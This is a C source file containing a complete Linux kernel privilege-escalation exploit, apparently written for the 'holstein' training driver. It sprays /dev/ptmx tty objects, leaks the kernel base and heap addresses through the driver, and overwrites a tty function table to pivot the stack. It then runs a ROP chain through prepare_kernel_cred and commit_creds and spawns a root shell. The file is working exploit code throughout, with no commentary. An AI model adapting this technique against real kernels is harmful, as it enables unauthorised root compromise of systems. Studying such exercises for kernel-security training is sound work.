#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#define prepare_kernel_cred 0x74650
#define commit_creds 0x744b0
#define pop_rdi 0x0d748d
#define pop_rcx 0x13c1c4
#define mov_rdi_rax_rep 0x62707b
#define swapgs_restore_regs_and_return_to_usermode 0x800e26
#define rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp 0x3a478a

unsigned long user_cs, user_ss, user_rflags, user_rsp;
unsigned long image_base = 0, heap_leak = 0;
int spray[100];

int gfd = 0;

static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory"
    );
}

static void win() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

static void exploit() {
    for(int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY  | O_NOCTTY);
    }

    gfd = open("/dev/holstein", O_RDWR);

    for(int i = 50; i < 100; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    }
    
    char buf[0x500];
    read(gfd, buf, 0x500);

    for(int i = 0; i <= 0x500; i += 8) {
        printf("[0x%04x] 0x%016lx\n", i, *(unsigned long *)&buf[i]);
    }

    image_base = *(unsigned long *)&buf[0x418] - 0xc38880;
    heap_leak = *(unsigned long*)&buf[0x438] - 0x438;
    printf("[+] image_base: 0x%016lx\n", image_base);
    printf("[+] heap_leak: 0x%016lx\n", heap_leak);

    // unsigned long *ptr = (unsigned long*)&buf;
    // for (int i = 0; i < 0x40; i++) {
    //     *ptr++ = 0xffffffffdead0000 + i;
    // }

    unsigned long *ptr = (unsigned long*)&buf[0x400];
    ptr[12] = image_base + rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp; // control RIP

    unsigned long *rop = (unsigned long *)&buf;
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = image_base + pop_rdi;
    *rop++ = 0;
    *rop++ = image_base + prepare_kernel_cred;
    *rop++ = image_base + pop_rcx;
    *rop++ = 0;
    *rop++ = image_base + mov_rdi_rax_rep;
    *rop++ = image_base + commit_creds;
    *rop++ = image_base + swapgs_restore_regs_and_return_to_usermode;
    *rop++ = 0xdeadbeef; // rax
    *rop++ = 0xcafebabe; // [rdi]
    *rop++ = (unsigned long)&win; // [rdi + 0x10]
    *rop++ = user_cs; // [rdi + 0x18]
    *rop++ = user_rflags; // [rdi + 0x20]
    *rop++ = user_rsp; // [rdi + 0x28]
    *rop++ = user_ss; // [rdi + 0x30]

    *(unsigned long*)&buf[0x418] =  heap_leak + 0x400;  // fake function table
    write(gfd, buf, 0x500);

    for(int i = 0; i < 100; i++) {
        ioctl(spray[i], 0xdeadbeef, heap_leak);  // set rdx for stack pivot
    }
}

int main() {
    save_state();
    exploit();
    return 0;
}